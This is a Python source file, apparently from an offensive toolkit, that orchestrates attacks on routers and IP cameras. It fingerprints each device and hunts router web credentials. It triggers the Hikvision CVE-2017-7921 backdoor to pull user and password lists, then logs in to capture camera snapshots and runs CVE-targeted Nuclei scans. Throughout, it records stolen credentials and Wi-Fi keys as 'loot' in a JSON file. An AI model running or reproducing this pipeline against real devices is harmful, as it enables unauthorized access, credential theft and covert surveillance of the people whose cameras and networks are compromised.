"""
Unified device exploit engine — bridges router scan workspace with nuclei-dev logic.
Called from core/classic/full_scan.py Phase 3 (before RouterSploit/Ingram).
"""

from __future__ import annotations

import json
import os
from typing import Any

from engines.credential_hunter import (
    hunt_hikvision_credentials,
    hunt_web_router_credentials,
    parse_ingram_results,
)
from engines.device_cve_checker import assess_device, print_cve_report, probe_hikvision_backdoor
from engines.fingerprinter import Fingerprinter
from engines.hikvision_module import HikvisionExploiter
from engines.loot_report import LootEntry, LootReport
from engines.scanner import Scanner
from engines.utils import log, save_success

CAMERA_DEVICE_TYPES = ("HIKVISION", "DAHUA", "GENERIC_DVR")
ROUTER_DEVICE_TYPES = (
    "NETIS", "TPLINK", "DLINK", "ZTE", "MIKROTIK", "OPENWRT", "CISCO", "UBIQUITI", "SYNOLOGY",
)


def _set_workspace(target_dir: str) -> None:
    os.environ["ENGINE_WORKSPACE"] = target_dir


def _pick_web_ports(web_ports: list[int] | None, profile: dict | None) -> list[int]:
    ports = list(web_ports or [])
    if profile:
        ports = list(profile.get("web_ports") or ports)
    if not ports:
        ports = [80]
    if 80 not in ports:
        ports.insert(0, 80)
    return sorted(set(ports))


def run_device_exploit_engine(
    ip: str,
    target_dir: str,
    web_ports: list[int] | None = None,
    profile: dict | None = None,
) -> dict[str, Any]:
    """
    Fingerprint → CVE intel → cred hunt → Hikvision/Netis exploits → targeted Nuclei.
    Returns summary dict; writes ENGINE_LOOT.json into target workspace.
    """
    _set_workspace(target_dir)
    os.makedirs("db", exist_ok=True)

    ports = _pick_web_ports(web_ports, profile)
    loot = LootReport(ip)
    loot.open_ports = ports
    scanner = Scanner()
    summary: dict[str, Any] = {
        "ip": ip,
        "exploited": False,
        "device_type": "UNKNOWN",
        "credentials": [],
        "cve_notes": [],
        "files": [],
    }

    log(f"\n>>> DEVICE ENGINE: {ip} (ports {ports}) <<<", "SUCCESS")

    for port in ports:
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        if port == 443:
            target_url = f"https://{ip}"

        fp = Fingerprinter(target_url)
        fp_info = fp.identify_details()
        device_type = fp_info["device_type"]
        device_model = fp_info.get("model", "")

        if device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port):
            device_type = "HIKVISION"

        is_camera = device_type in CAMERA_DEVICE_TYPES
        is_router = device_type in ROUTER_DEVICE_TYPES
        router_pwned = False
        camera_handled = False

        log(f"Detected: {device_type} | {device_model or 'no model'}", "INFO")

        device_intel = assess_device(
            ip, port, device_type, device_model, fp_info.get("server", ""),
        )
        print_cve_report(device_intel)

        # Router credentials (Netis form, HTTP Basic)
        if not is_camera and (is_router or device_type == "UNKNOWN"):
            entry = hunt_web_router_credentials(ip, port, device_type)
            if entry:
                if "netis" in (entry.model or "").lower():
                    device_type = "NETIS"
                loot.add(entry)
                save_success(ip, f"Web ({port})", f"{entry.username}:{entry.password}")
                summary["credentials"].append(entry.creds_display())
                summary["exploited"] = True
                router_pwned = True
                log(f"Router creds: {entry.creds_display()}", "PWN")

        # Hikvision pipeline
        if device_type == "HIKVISION" or (device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port)):
            device_type = "HIKVISION"
            camera_handled = True
            hexp = HikvisionExploiter(target_url)
            hik_users, hik_passwords = hexp.run_backdoor()

            cred_entry = hunt_hikvision_credentials(ip, hik_users, hik_passwords, port)
            if cred_entry:
                loot.add(cred_entry)
                save_success(ip, f"Hikvision ({port})", cred_entry.creds_display())
                summary["credentials"].append(cred_entry.creds_display())
                summary["exploited"] = True
                log(f"Hikvision real password: {cred_entry.creds_display()}", "PWN")
            elif getattr(hexp, "backdoor_active", False):
                loot.add(
                    LootEntry(
                        ip=ip,
                        port=port,
                        device_type="HIKVISION",
                        model=device_model,
                        username=hik_users[0] if hik_users else "admin",
                        password="11",
                        auth_method="CVE-2017-7921 backdoor (NOT real password)",
                    )
                )
                summary["exploited"] = True

            try:
                from engines.camera_viewer import CameraViewer

                use_backdoor = not cred_entry and getattr(hexp, "backdoor_active", False)
                cam_user = cred_entry.username if cred_entry else "admin"
                cam_pass = cred_entry.password if cred_entry else "11"
                cam = CameraViewer(ip, cam_user, cam_pass, use_backdoor_auth=use_backdoor)
                snap_paths = cam.take_snapshots()
                for p in snap_paths:
                    loot.add_file(p)
                    summary["files"].append(p)
            except Exception as exc:
                log(f"Camera snapshots skipped: {exc}", "WARNING")

        # CVE-targeted Nuclei
        if device_intel.assessments:
            hits = scanner.scan_cve_intel(target_url, device_intel)
            for h in hits:
                tid = h.get("template-id", "?") if isinstance(h, dict) else str(h)
                summary["cve_notes"].append(tid)

        # Ingram results already in workspace
        for ingram_entry in parse_ingram_results(ip):
            loot.add(ingram_entry)
            summary["credentials"].append(ingram_entry.creds_display())
            summary["exploited"] = True

        summary["device_type"] = device_type
        if router_pwned or camera_handled:
            break

    loot_path = os.path.join(target_dir, "ENGINE_LOOT.json")
    payload = {
        "summary": summary,
        "loot": {
            "entries": [
                {
                    "port": e.port,
                    "device_type": e.device_type,
                    "model": e.model,
                    "username": e.username,
                    "password": e.password,
                    "auth_method": e.auth_method,
                    "wireless_ssid": e.wireless_ssid,
                    "wireless_key": e.wireless_key,
                }
                for e in loot.entries
            ],
            "files": loot.files,
            "notes": loot.notes,
        },
    }
    with open(loot_path, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2, ensure_ascii=False)

    loot.print_final()
    log(f"Engine loot saved: {loot_path}", "SUCCESS")
    return summary
